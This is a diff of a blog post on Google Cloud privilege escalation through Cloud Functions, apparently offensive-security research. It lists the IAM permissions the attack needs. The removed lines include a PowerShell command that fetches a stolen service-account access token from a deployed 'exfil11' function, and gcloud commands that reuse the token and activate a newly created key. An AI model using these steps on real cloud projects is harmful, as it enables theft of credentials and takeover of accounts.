@@ -418,6 +418,11 @@ Here's an image to understand it better.
   <img src="https://github.com/anrbn/blog/blob/main/images/32.1.jpg">
 </p>
 
+>Note: If a function already exists then in most cases you won't need to set any IAM Policy Binding to the Cloud Function. You'd need `cloudfunctions.functions.list` permission to list out functions existing in the project. The Function could be public which means anyone can access the function. But in some cases the function could be private which means only certain user, group or service account has access to the function. In that case you'd need to set an IAM Policy Binding to the Cloud Function.
+
+Permissions required for Listing Cloud Functions via Cloud Function API (Optional) 
+- `cloudfunctions.functions.list`
+
 ### Updating a Cloud Function via gCloud
 
 <table>
@@ -597,15 +602,6 @@ However, invoking the function will lead to the following error: *Your client do
 <p>
   <img src="https://github.com/anrbn/blog/blob/main/images/24.png">
 </p>
-
-
-
-
-
-
-
-
-
 
 ## Phase II - Ways to Set IAM Policy Binding to a Cloud Function in Google Cloud Platform
 
@@ -818,99 +814,37 @@ body='{}'
 response=$(curl -sS -X POST -H "${headers}" -d "${body}" -m 70 '<function-invocation-url>')
 echo "${response}" | jq -r '.access_token'
 ``` 
-  
+
 ## Phase III - Privilege Escalating via Cloud Function in Google Cloud Platform
-To Privilege Escalate via Cloud Function in Google Cloud Platform we'll be taking the path with least privileges possible. 
-- Deploying the Cloud Function
-  - Identify how you'd to **Upload the Source Code** & via which method.
-    - Ways to upload the Source Code: Local Machine, Cloud Storage, Cloud Repository
-    - Methods Available: gCloud, Cloud Function API (gRPC/REST)
-- Setting IAM Policy Binding to the Cloud Function
-  - Identify how you'd **Set the IAM Policy Binding to the Cloud Function**.
-    - Methods Available: gCloud, Cloud Function API (gRPC/REST)
+To Privilege Escalate via Cloud Function in Google Cloud Platform we'll be taking the path with least permissions required. 
+- **Deploying the Cloud Function**
+  - Uploading the Code: Cloud Storage
+  - Method we'll be using: Cloud Function API (gRPC)
+- **Setting IAM Policy Binding to the Cloud Function**
+  - Method we'll be using: Cloud Function API (gRPC)
 
-**Deploying the Cloud Function**: We'll deploy the Cloud Function by setting the Source Code from Cloud Storage via the Cloud Function API (gRPC) as it requires the least privileges.
+or if a function exists already, you could just update it.
+- **Updating the Cloud Function**
+  - Updating the Code: Cloud Storage
+  - Method we'll be using: Cloud Function API (gRPC)
+- **Listing Info about Cloud Function** (Optional)
+  - Method we'll be using: Cloud Function API (gRPC)
 
-**Setting IAM Policy Binding to the Cloud Function**: We'll set the IAM Policy Binding to the Cloud Function via Cloud Function API (gRPC) as it's the one that does it with least permissions than others.
-
->Note: One can use either gRPC or REST to make requests to the Cloud Function API, the Cloud Function API will then interact with the Cloud Functions service. The Permissions required to Deploy and Set IAM Policy Binding are same for both gRPC and REST.
-
-These are the permissions required for the overall task:
+We'll be using the tool to Deploy, Update, List Details and Set IAM Policy Binding to the Cloud Function using Cloud Function API. We'll be calling the Cloud Function API using gRPC.
+Permissions required for Deploying a Cloud Function via Cloud Function API 
 - `iam.serviceAccounts.actAs`
 - `cloudfunctions.functions.create`
+Permissions required to set IAM Policy Binding to the Cloud Function via Cloud Function API 
 - `cloudfunctions.functions.setIamPolicy`
+Permissions required for Updating a Cloud Function via Cloud Function API 
+- `iam.serviceAccounts.actAs`
+- `cloudfunctions.functions.update`
+Permissions required for Listing Cloud Functions via Cloud Function API (Optional) 
+- `cloudfunctions.functions.list`
+
+>Note: One can use either gRPC or REST to make requests to the Cloud Function API, the Cloud Function API will then interact with the Cloud Functions service. The Permissions required to Deploy, Update and Set IAM Policy Binding are same for both gRPC and REST.
 
 ### Deploying the Cloud Function via Cloud Function API (gRPC)
-
-1. Create a new role and add the following permissions to it.
-- `iam.serviceAccounts.actAs`
-- `cloudfunctions.functions.create`
-- `cloudfunctions.functions.setIamPolicy`
-
-2. I created two different roles but you can put the three permissions in one role.
-<p float="left">
-<img src="https://github.com/anrbn/blog/blob/main/images/13.JPG" width="500" />
-<img src="https://github.com/anrbn/blog/blob/main/images/12.JPG" width="500" /> 
-<img src="https://github.com/anrbn/blog/blob/main/images/11.png" width="1000" /> 
-</p>
-
-3. With the roles set, its time we upload the Source Code to Cloud Storage in a separate account (Attacker Controlled account). Upload the following ZIP file [function.zip](https://github.com/anrbn/blog/blob/main/code/function.zip) to the Cloud Storage. Copy the GS URL and update line No. 7 of the below code. (Point 4)  
-
->The code will query the metadata server and retrieve an access token for the default service account and then print that token to response body when a request is made to that specific endpoint.
-
-4. With the code uploaded to Cloud Storage let's Deploy the Cloud Function. We'll use the following script [grpc-deploy-storage.py](https://github.com/anrbn/blog/blob/main/code/grpc-deploy-storage.py) for that.
-
-<p>
-  <img src="https://github.com/anrbn/blog/blob/main/images/14.1.png">
-</p>
-
-5. Next up we'll move to "Setting IAM Policy Binding to the Cloud Function via Cloud Function API (gRPC)"
-
+### Updating the Cloud Function via Cloud Function API (gRPC)
 ### Setting IAM Policy Binding to the Cloud Function via Cloud Function API (gRPC)
-
-1. Set the IAM Policy Binding to the Cloud Function via this script [grpc-setiampolicy.py](https://github.com/anrbn/blog/blob/main/code/grpc-setiampolicy.py).
-
-<p>
-  <img src="https://github.com/anrbn/blog/blob/main/images/15.1.png">
-</p>
-
-2. `curl` the endpoint to get the access token. (Output of `grpc-deploy-storage.py` will give you the endpoint to query, note the "Function Invocation URL: ") 
-
-<p>
-  <img src="https://github.com/anrbn/blog/blob/main/images/16.png">
-</p>
-
-### Escalating Privilege to a High Level Service Account
-
-With the access to the *access_token* what can we do? Well, a lot. One being authenticating and accessing various GCP APIs, services and resources, such as Google Cloud Storage, Google Cloud Compute Engine, and Google Kubernetes Engine etc. Here's an argument (--access-token-file) you can use with gCloud after you've gotten access to the *access_token*. Put the *access_token* in a file and specify it with the argument '--access-token-file' with gcloud. The *access_token* will allow you to perform actions and access resources in GCP as the user or service account associated with the token. 
-
-Below is a Powershell Command that will put the the *access_token* into a txt file, to be used later with gCloud.
-
-```powershell
-$response = Invoke-WebRequest -Uri "https://us-east1-nnnn-374620.cloudfunctions.net/exfil11" -UseBasicParsing
-$jsonResponse = $response | ConvertFrom-Json
-$accessToken = $jsonResponse.access_token
-$accessToken | Out-File -FilePath "code.txt"
-```
-Example Usage:
-
-```shell
-gcloud projects list --access-token-file=code.txt
-gcloud projects list --access-token-file=C:\Users\Administrator\code.txt
-```
->You might encounter an error *"ERROR: gcloud crashed (UnicodeDecodeError): 'utf-8' codec can't decode byte 0xff in position 0: invalid start byte"* if you use the above command. This has something to do with the gCloud version in use.
-
-The better way next after getting the *access_token* would be to download the Service Account Key (the Service Account you just compromised) in JSON format. Use the python script [rest-createserviceaccountkey.py](https://github.com/anrbn/blog/blob/main/code/rest-createserviceaccountkey.py), it'll create a new JSON Key and download it. 
-
-Once you've downloaded the JSON Key file for the Service Account you can authenticate and activate it via gCloud. 
-
-Command to Activate the Service Account via gcloud:
-
-```shell
-gcloud auth activate-service-account --key-file="C:/Users/Administrator/Downloads/service_account.json" 
-```
-<p>
-  <img src="https://github.com/anrbn/blog/blob/main/images/17.png">
-</p>
-
-After you've activated the Service Account, you can now run commands as the activated service account user. Since the Service Account has Editor level permission one can perform a wide range of actions on Google Cloud resources.
+### Escalating Privilege to a high level Service Account
